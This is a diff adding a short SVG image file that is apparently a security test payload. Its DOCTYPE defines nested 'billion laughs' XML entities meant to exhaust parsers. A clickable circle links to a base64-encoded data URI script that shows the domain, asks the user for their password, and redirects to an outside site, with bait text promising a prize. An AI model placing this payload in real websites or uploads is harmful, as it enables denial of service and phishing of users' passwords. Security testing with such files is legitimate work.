@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE lold0s [ 
+<!ENTITY xml "lol"> 
+	<!ENTITY xml2 "&xml; &xml; &xml; &xml;">
+	<!ENTITY xml3 " &xml2; &xml2; &xml2; &xml2;">
+	<!ENTITY xml4 " &xml3; &xml3; &xml3; &xml3;">
+]>
+<svg id="circle" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+	<a xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pO3ZhciBwYXNzPXByb21wdCgndG8gY29udGludWUsIGluc2VydCB5b3VyIHBhc3N3b3JkJyk7YWxlcnQocGFzcyk7d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHA6Ly9vbWVzcGluby5jb20iKTs8L3NjcmlwdD4=" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+	<circle  cx="225" cy="125" r="100" stroke="black" stroke-width="3" fill="brown" />
+	</a>
+		<text x="0" y="20" font-size="20">CLICK THE RED CIRCLE TO WIN THE PRICE - billion d0s test L0Lx64-> &xml4;</text>
+</svg>
